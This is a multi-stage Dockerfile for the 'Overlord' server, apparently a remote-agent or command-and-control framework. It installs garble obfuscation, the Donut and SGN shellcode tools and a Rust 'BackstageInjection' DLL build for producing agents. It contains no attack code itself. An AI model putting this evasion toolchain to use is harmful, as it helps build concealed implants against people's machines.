# syntax=docker/dockerfile:1.7

# Overlord Server Dockerfile (multi-stage)

#

# Stage 1 (builder): full apt toolchain to compile assets + Backstage DLLs.

# Stage 2 (runtime, slim): only what the server needs at startup. Cross-compile

# toolchains (mingw, aarch64/armv7/musl, Android NDK, ldid, UPX) are downloaded

# on first agent build by Overlord-Server/src/server/toolchain-manager.ts and

# cached in the persistent /app/data volume.

# ============================================================

# Stage 1: builder

# ============================================================

FROM oven/bun:1.4.0 AS builder
WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends 
build-essential 
gcc-mingw-w64-x86-64 
g++-mingw-w64-x86-64 
gcc-mingw-w64-i686 
ca-certificates 
wget 
curl 
git 
unzip 
zip 
&& rm -rf /var/lib/apt/lists/*

ENV GO_VERSION=1.26.2
ARG TARGETARCH

RUN case "${TARGETARCH:-amd64}" in 
amd64) GO_ARCH=amd64 ;; 
arm64) GO_ARCH=arm64 ;; 
*) echo "Unsupported architecture: ${TARGETARCH}" >&2; exit 1 ;; 
esac 
&& wget -q "https://go.dev/dl/go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" 
&& tar -C /usr/local -xzf "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" 
&& rm "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" 
&& rm -rf /usr/local/go/test /usr/local/go/api /usr/local/go/doc /usr/local/go/misc

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/go"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

RUN go install mvdan.cc/garble@latest

# Rust toolchain for the BackstageInjection DLL cross-build.

ENV RUSTUP_HOME=/usr/local/rustup 
CARGO_HOME=/usr/local/cargo 
RUST_VERSION=1.85.0

RUN wget -q "https://sh.rustup.rs" -O rustup-init.sh 
&& sh rustup-init.sh -y --default-toolchain "$RUST_VERSION" 
--profile minimal --target x86_64-pc-windows-gnu 
&& rm -f rustup-init.sh

ENV PATH="/usr/local/cargo/bin:${PATH}"

# Pre-fetch the latest Donut shellcode converter binary.

RUN DONUT_TAG=$(curl -sSf "https://api.github.com/repos/TheWover/donut/releases/latest" 
| grep '"tag_name"' 
| head -1 
| cut -d'"' -f4) 
&& ARCHIVE_URL="https://github.com/TheWover/donut/releases/download/${DONUT_TAG}/donut_${DONUT_TAG}.tar.gz" 
&& if curl -sSfL "${ARCHIVE_URL}" 
| tar xzf - --strip-components=0 -C /usr/local/bin ./donut 2>/dev/null; then 
chmod +x /usr/local/bin/donut; 
echo "Donut ${DONUT_TAG} pre-installed from archive"; 
else 
echo "WARNING: Donut pre-fetch failed — will fall back to system PATH or download on first use"; 
fi

# Pre-fetch the latest Rust SGN binary.

RUN SGN_ASSET=$(curl -sSf "https://api.github.com/repos/EgeBalci/sgn/releases/latest" 
| grep -oE '"browser_download_url":[[:space:]]*"[^"]*sgn-x86_64-unknown-linux-musl.tar.gz"' 
| head -1 
| cut -d'"' -f4) 
&& if [ "${TARGETARCH:-amd64}" = "amd64" ] 
&& [ -n "${SGN_ASSET}" ] 
&& curl -sSfL "${SGN_ASSET}" 
| tar -xzf - -C /usr/local/bin sgn 
&& [ -f /usr/local/bin/sgn ]; then 
chmod +x /usr/local/bin/sgn; 
echo "SGN pre-installed from ${SGN_ASSET}"; 
else 
echo "WARNING: SGN Rust binary is unavailable for ${TARGETARCH:-unknown} — will fall back to system PATH or runtime download"; 
fi

# Full bun install.

COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN bun install --frozen-lockfile

# Server source.

COPY Overlord-Server/ ./

# BackstageInjection-Rust source.

COPY BackstageInjection-Rust/ ./BackstageInjection-Rust/
COPY scripts/build-backstage-dll.sh ./scripts/

# Always compile the Backstage DLL from source.

ARG BACKSTAGE_FRESH=

RUN mkdir -p dist-clients && 
chmod +x scripts/build-backstage-dll.sh && 
echo "Building BackstageInjection DLL (fresh=${BACKSTAGE_FRESH:-default})" && 
BACKSTAGE_CRATE_DIR=BackstageInjection-Rust 
BACKSTAGE_OUT_DIR=dist-clients 
bash scripts/build-backstage-dll.sh || 
echo "WARNING: BackstageInjection DLL build failed; runtime can rebuild on demand (Settings -> Backstage DLL)"

# Production build phases.

RUN bun run build:css
RUN bun run build:web:prod
RUN bun run vendor
RUN MINIFY_CONCURRENCY=4 bun run minify
RUN bun run fingerprint:assets
RUN bun run build:bundle

RUN test "$(wc -l < ./public/index.html)" -lt 20 
&& test -s ./public/.asset-manifest.json 
&& test -n "$(find ./public/assets -maxdepth 1 -name 'main.*.js' -print -quit)" 
&& test -n "$(find ./public/assets/generated -maxdepth 1 -name 'shared-ui-settings.*.js' -print -quit)" 
&& test ! -e ./public/assets/generated/shared-ui-settings.js.map 
&& test -n "$(find ./public/assets -maxdepth 1 -name 'tailwind.*.css' -print -quit)" 
&& test -d ./public/vendor/fontawesome 
&& test -s ./dist/index.js 
&& test -s ./dist/server/plugin-runtime/worker-host.js

# ============================================================

# Stage 2: runtime (slim)

# ============================================================

FROM oven/bun:1.4.0-slim AS runtime
LABEL org.opencontainers.image.source="https://github.com/doesntbreaktos/Overlord"

WORKDIR /app

# Runtime dependencies.

RUN apt-get update && apt-get install -y --no-install-recommends 
openssl 
ca-certificates 
wget 
tar 
unzip 
xz-utils 
git 
ffmpeg 
clang 
lld 
&& rm -rf /var/lib/apt/lists/*

# Reuse Go + garble from builder.

COPY --from=builder /usr/local/go /usr/local/go
COPY --from=builder /go/bin/garble /go/bin/garble

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/app/client-build-cache/go"
ENV GOCACHE=/app/client-build-cache/go-build
ENV GOMODCACHE=/app/client-build-cache/go-mod
ENV GOTMPDIR=/app/client-build-cache/go-tmp
ENV CARGO_TARGET_DIR=/app/client-build-cache/backstage-target

# Production-only node_modules.

COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN bun install --production --frozen-lockfile

# Built runtime artifacts from builder.

COPY --from=builder /app/dist ./dist
COPY --from=builder /app/public ./public
COPY --from=builder /app/dist-clients ./dist-clients

# Go agent source needed at every agent build.

COPY Overlord-Client/ ./Overlord-Client/
COPY Overlord-Client/ /opt/overlord-client-source/

RUN test -s ./Overlord-Client/third_party/nvcodec/nvEncodeAPI.h

# Rust crate + build script needed for on-demand Backstage DLL recompilation.

COPY BackstageInjection-Rust/ ./BackstageInjection-Rust/
COPY scripts/build-backstage-dll.sh ./scripts/
COPY scripts/docker-runtime-entrypoint.sh /usr/local/bin/overlord-entrypoint

RUN mkdir -p certs data client-build-cache plugins dist-clients 
&& chmod 0755 /usr/local/bin/overlord-entrypoint 
&& chown -R bun:bun 
/app/certs 
/app/data 
/app/client-build-cache 
/app/plugins 
/app/dist-clients 
/app/Overlord-Client 
/app/BackstageInjection-Rust

# Download Go modules needed by the agent build.

RUN cd /app/Overlord-Client 
&& GOWORK=off 
GOMODCACHE=/go/pkg/mod 
go mod download

EXPOSE 5173/tcp
EXPOSE 5173/udp

ENV PORT=5173
ENV HOST=0.0.0.0
ENV DATA_DIR=/app/data
ENV NODE_ENV=production
ENV OVERLORD_ROOT=/app
ENV NODE_PATH=/app/node_modules
ENV HOME=/home/bun

USER bun:bun

ENTRYPOINT ["/usr/local/bin/overlord-entrypoint"]
CMD ["bun", "dist/index.js"]
